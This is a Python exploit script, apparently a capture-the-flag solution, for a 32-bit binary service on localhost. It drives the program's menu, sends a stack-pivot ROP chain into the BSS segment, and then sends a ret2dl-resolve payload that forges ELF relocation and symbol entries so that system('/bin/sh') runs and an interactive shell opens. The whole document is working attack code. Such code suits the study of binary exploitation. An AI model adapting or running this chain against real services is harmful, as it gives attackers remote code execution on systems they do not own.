# -*- coding: utf-8 -*-
from m1z0r3 import *

ip = "localhost"
port = 4444

addr_plt_read = 0x80484f0
addr_bss = 0x0804cc00
stacksize = 0x400
base_stage = addr_bss + stacksize

addr_p3_ret = 0x08048f0d
addr_pop_ebp = 0x080487a0
addr_leave_ret = 0x08048638

addr_dynsym = 0x080481d8
addr_dynstr = 0x080482f8
addr_relplt = 0x08048440
addr_plt = 0x080484e0
addr_got_read = 0x804c00c

s,f = sock(ip,port)

read_until(f)
s.send("Kyuri\n")

read_until(f,"|")
s.send("3\n")
read_until(f,"|")
s.send("101\n")
read_until(f,"|")

# stack pivot
buf = "AAAA"*3
buf += p32(addr_plt_read)
buf += p32(addr_p3_ret)
buf += p32(0)
buf += p32(base_stage)
buf += p32(100)
buf += p32(addr_pop_ebp)
buf += p32(base_stage)
buf += p32(addr_leave_ret)

s.send(buf[:20])
read_until(f,"|")
s.send(buf[20:])

# exit
read_until(f,"|")
s.send("4\n")

addr_reloc = base_stage + 20
addr_sym = addr_reloc + 8
align_dynsym = 0x10 - ((addr_sym-addr_dynsym) & 0xF)
addr_sym += align_dynsym
addr_symstr = addr_sym + 16
addr_cmd = addr_symstr + 7

reloc_offset = addr_reloc - addr_relplt
r_info = ((addr_sym - addr_dynsym) << 4) & ~0xFF | 0x7
st_name = addr_symstr - addr_dynstr

# return to dl resolve
buf = "AAAA"
buf += p32(addr_plt)
buf += p32(reloc_offset)
buf += "AAAA"
buf += p32(addr_cmd) # arg of system
buf += p32(addr_got_read) # Elf32_Rel
buf += p32(r_info)
buf += "A" * align_dynsym
buf += p32(st_name) # Elf32_Sym
buf += p32(0)
buf += p32(0)
buf += p32(12)
buf += 'system\x00'
buf += '/bin/sh\x00'
buf += 'A' * (100-len(buf))

s.send(buf)

shell(s)
